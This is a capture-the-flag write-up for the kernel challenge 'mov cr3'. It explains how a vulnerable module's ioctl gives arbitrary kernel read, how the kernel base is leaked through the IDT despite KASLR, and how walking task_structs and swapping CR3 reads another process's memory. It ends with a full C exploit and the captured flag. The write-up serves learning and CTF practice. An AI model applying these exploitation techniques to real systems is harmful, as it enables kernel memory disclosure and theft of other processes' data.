# mov cr3 writeup

## Description

I want to steal a message my friend cocay has.

Can u help me with that?

`$ nc something.challenge.cr3c.tf 1337`

flag is at `/flag.txt`

**author**: brwook

## Environment Analysis

```sh
#!/bin/sh
qemu-system-x86_64 \
    -m 64M \
    -kernel /app/bzImage \
    -initrd /app/rootfs.cpio \
    -append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr" \
    -nographic \
    -cpu qemu64,smep,smap \
    -no-reboot
```

Let's see `run.sh`. Some mitigations are enabled.
- kaslr
- smep
- smap

```bash
$ id
uid=1000 gid=1000 groups=1000

$ ls -al
total 1036
drwxrwxr-x   12 1000     1000             0 Mar 11 16:36 .
drwxrwxr-x   12 1000     1000             0 Mar 11 16:36 ..
-rw-------    1 1000     1000             7 Mar 11 16:36 .ash_history
drwxrwxr-x    2 0        0                0 Mar 11 11:02 bin
-rwx------    1 0        0           900432 Mar 11 12:17 cocay
drwxr-xr-x    7 0        0             2280 Mar 11 16:36 dev
drwxrwxr-x    2 0        0                0 Mar 11 11:02 etc
-rwxr-xr-x    1 0        0              293 Mar 11 11:03 init
drwxrwxr-x    2 0        0                0 Mar 11 11:02 lib
lrwxrwxrwx    1 0        0               11 Mar 11 11:02 linuxrc -> bin/busybox
-rw-rw-r--    1 0        0           147552 Mar 11 11:02 movcr3.ko
dr-xr-xr-x  103 0        0                0 Mar 11 16:36 proc
drwx------    2 0        0                0 Mar 11 06:15 root
drwxrwxr-x    2 0        0                0 Mar 11 11:02 sbin
dr-xr-xr-x   12 0        0                0 Mar 11 16:36 sys
drwxrwxr-x    2 1000     1000             0 Mar 11 11:02 tmp
drwxrwxr-x    4 0        0                0 Mar 11 11:02 usr
```

We have a write permission on root filesystem(/) and `tmp` directory.

```bash
$ cat init
#!/bin/sh
mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs devtmpfs /dev
exec 0</dev/console
exec 1>/dev/console
exec 2>/dev/console

insmod /movcr3.ko
chmod 700 /cocay
chmod 666 /dev/movcr3
/cocay &

setsid cttyhack setuidgid 1000 sh
umount /proc
umount /sys
poweroff -d 0
```

`cocay` process runs with the init process and it has flag. We should leak the flag embeded in the `cocay` process using `movcr3.ko`

## Code Inspection

There is a kernel device `/dev/movcr3`. It has only one file operation, ioctl.

```c
/* Methods */ 
static long device_ioctl(struct file *filp, unsigned int cmd, 
                             unsigned long arg) 
{
    long retval = 0;
    long val = 0;
    struct ioctl_read_user_arg data_user;
    struct ioctl_read_kernel_arg data_kernel;

    // initialize struct var
    memset(&data_user, 0, sizeof(data_user));
    memset(&data_kernel, 0, sizeof(data_kernel));

    switch (cmd) {
        // AAR in kernel-land
        case IOCTL_READ:
            if (copy_from_user(&data_kernel, (int __user *)arg, sizeof(data_kernel))) {
                retval = -EFAULT;
                goto done;
            }

            if (copy_to_user((void *)data_kernel.dst, (void *)data_kernel.src, data_kernel.n)) {
                retval = -EFAULT;
                goto done;
            }
            break;
```

`IOCTL_READ` command gives us AAR in kernel-land. It means that we can leak kernel base and read whole things in kernel.

Interrupt Descriptor Table (IDT) isn't affected by KASLR. So, we can leak it (`CPU_ENTRY_AREA_RO_IDT(0xfffffe0000000000)`) and get the kernel base.

```c
        // AAR in user-land with CR3 register
        case IOCTL_READ_WITH_CR3:
            if (copy_from_user(&data_user, (int __user *)arg, sizeof(data_user))) {
                retval = -EFAULT;
                goto done;
            }

            asm volatile ("mov %0, %%cr3" : : "r" (data_user.cr3_to));
            if (copy_from_user(&val, (int __user *)data_user.src, 8)) {
                retval = -EFAULT;
                goto done;
            }
            
            asm volatile ("mov %0, %%cr3" : : "r" (data_user.cr3_from));
            if (copy_to_user((int __user *)data_user.dst, &val, 8)) {
                retval = -EFAULT;
                goto done;
            }
            
            break;
    }

done:
    return retval;
}
```

And `IOCTL_READ_WITH_CR3` command gives us AAR in user-land with user-given CR3 register. It means that we can manipulate the virtual address conversion.

In normal circumstances, all the processes have a similar virtual address mappings, and it is classified by CR3 register. 
When interpreting the virtual address, CPU uses CR3 register.

By changing the CR3 register, we can see other processes' virtual or physical memory.

## Get PML4 Table address and convert it into physical address

Actually, CR3 register holds the physical address of Page Map Level (PML) 4 Table address.
CPU decodes the virtual address into physical address by using this PML4 table.
So, if we can leak the PML4 table of `cocay` process, then we can get the flag using `IOCTL_READ_WITH_CR3`.

```py
# cpu has physical address of PML4 table.
gef> i r cr3
cr3            0x3246000           [ PDBR=12870 PCID=0 ]

gef> p ((struct task_struct*)0xffff888003d3c740)->mm->pgd
$5 = (pgd_t *) 0xffff888003246000

# kernel has virtual address of PML4 table.
gef> v2p $5
Virt: 0xffff888003246000 -> Phys: 0x3246000

# seeing PML4 table memory (virtual address)
gef> x/10gx 0xffff888003246000
0xffff888003246000:     0x000000000321a067      0x0000000000000000
0xffff888003246010:     0x0000000000000000      0x0000000000000000
0xffff888003246020:     0x0000000000000000      0x0000000000000000
0xffff888003246030:     0x0000000000000000      0x0000000000000000
0xffff888003246040:     0x0000000000000000      0x0000000000000000

# seeing PML4 table memory (physical address)
gef> xp/10gx 0x3246000
0000000003246000: 0x000000000321a067 0x0000000000000000
0000000003246010: 0x0000000000000000 0x0000000000000000
0000000003246020: 0x0000000000000000 0x0000000000000000
0000000003246030: 0x0000000000000000 0x0000000000000000
0000000003246040: 0x0000000000000000 0x0000000000000000
```

You can leak the PML 4 table by using `task_struct`. 
The member `task_struct->mm->pgd` of the task is the virtual address of its PML 4 table. 
If we can leak it, then we have to change it with the physical address.

There is a [good reference](https://www.kernel.org/doc/gorman/pdf/understand.pdf) for it.
Look at "3.7.1 Mapping Physical to Virtual Kernel Addresses".

```
#define __pa(x) ((unsigned long)(x) - PAGE_OFFSET)
```

When you want to find your task, you can search the process name from `init_task`.

```py
gef> x/gx &init_task
0xffffffff82a0c900 <init_task>: 0x0000000000004000

gef> p init_task->comm
$2 = "swapper/0\000\000\000\000\000\000"

gef> p ((struct task_struct *)(((void *)init_task->children->next) - 0x550))->comm
$3 = "init", '\000' <repeats 11 times>
```

By traversing from `init_task`, you can find your exploit process and cocay process and leak the PML4 table physical address through `task_struct->mm->pgd`, right?

Let's code the exploit and send it to remote server.

I sent my exploit through [this script](https://github.com/pr0cf5/kernel-exploit-sendscript) and applied the [upx packer](https://github.com/upx/upx) to reduce the size of this binary.


## Solver.c

```c
// gcc -masm=intel -static -o ex ex.c -no-pie
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdint.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <assert.h>
#include <sys/mman.h>

#define IOCTL_READ          0x1001
#define IOCTL_READ_WITH_CR3 0x1002

void fatal(const char *msg) {
  perror(msg);
  exit(1);
}
struct ioctl_read_kernel_arg {
    size_t dst;
    size_t src;
    size_t n;
};

struct ioctl_read_user_arg {
    void *dst;
    void *src;
    size_t cr3_from;
    size_t cr3_to;
};

int fd;
void aar(void *buf, void *addr, size_t n)
{
    struct ioctl_read_kernel_arg data = {
        .dst = buf,
        .src = addr,
        .n = n
    };

    if (ioctl(fd, IOCTL_READ, &data)) {
        printf("[IOCTL_READ] Failed :(\n");
        exit(1);
    }
}

int aar_cr3(void *dst, void *src, size_t cr3_from, size_t cr3_to) {
    struct ioctl_read_user_arg data = {
        .dst = dst,
        .src = src,
        .cr3_from = cr3_from,
        .cr3_to = cr3_to
    };
    if (ioctl(fd, IOCTL_READ_WITH_CR3, &data)) {
        printf("[IOCTL_READ_WITH_CR3] Failed :(\n");
        exit(1);
    }
}

int main()
{
    size_t kbase = 0;
    void *mm;
    size_t pgd;
    char buf[0x1000] = {0,};
    long flag[100] = {0, };
    void *pagetable_cocay;
    void *pagetable_current;
    void *phy_cocay;
    void *phy_current;
    size_t page_offset_base = 0;
    fd = open("/dev/movcr3", O_RDWR);
    if (fd == -1)
        fatal("open");

    aar(buf, (void *)0xfffffe000000000c, 0x10);
    
    kbase = *(size_t *)&buf[0x8] - 0x1008e03;
    printf("[*] kbase : 0x%lx\n", kbase);

    aar(&page_offset_base, kbase + 0x17c01f8, 0x8);

    if (prctl(PR_SET_NAME, "brwook", 0, 0, 0) != 0) fatal("prctl");
    void *current = kbase + 0x1a0c900; // 'current' of swapper
    while (1) {
        aar(buf, current, 0x720);
        printf("[.] Traversing task: 0x%016lx (%s)\n", current, buf + 0x718);

        // check that task_struct->comm is same with "init"
        if (strcmp(buf + 0x718, "init") == 0)
            break;
        
        // (task_struct->children->next - 0x550) == next task_struct of child
        current = *(size_t*)(buf + 0x540) - 0x550;
    }

    void *cocay = *(size_t *)(buf + 0x540) - 0x550;    
    current = *(size_t*)(buf + 0x548) - 0x550;
    printf("[*] Found cocay task at 0x%016lx\n", cocay);
    
    while (1) {
        aar(buf, current, 0x720);
        printf("[.] Traversing task: 0x%016lx (%s)\n", current, buf + 0x718);
        if (strcmp(buf + 0x718, "brwook") == 0)
            break;
        
        current = *(size_t*)(buf + 0x540) - 0x550;
    }

    printf("[*] Found current task at 0x%016lx\n", current);

    aar(&mm, cocay + 0x4a8, 8);
    aar(&pgd, mm + 0x80, 8);
    phy_cocay = pgd - page_offset_base;
    printf("[*] Pagetable Virtual address of cocay (0x%016lx)\n", pgd);
    printf("[*] Pagetable Physical address of cocay (0x%016lx)\n", phy_cocay);

    aar(&mm, current + 0x4a8, 8);
    aar(&pgd, mm + 0x80, 8);
    phy_current = pgd - page_offset_base;
    printf("[*] Pagetable Virtual address of current (0x%016lx)\n", pgd);
    printf("[*] Pagetable Physical address of current (0x%016lx)\n\n", phy_current);

    void *flag_addr = 0x498008;
    for (int i=0; i<10; ++i) {
        aar_cr3(&flag[i], flag_addr + i * 8, phy_current, phy_cocay);
    }
    printf("[+] FLAG : %s\n", (char *)flag);
    return 0;
}
```

`cr3{N0W_y0U_kN0w_Wh47_cr3_r39i573r5_D0}`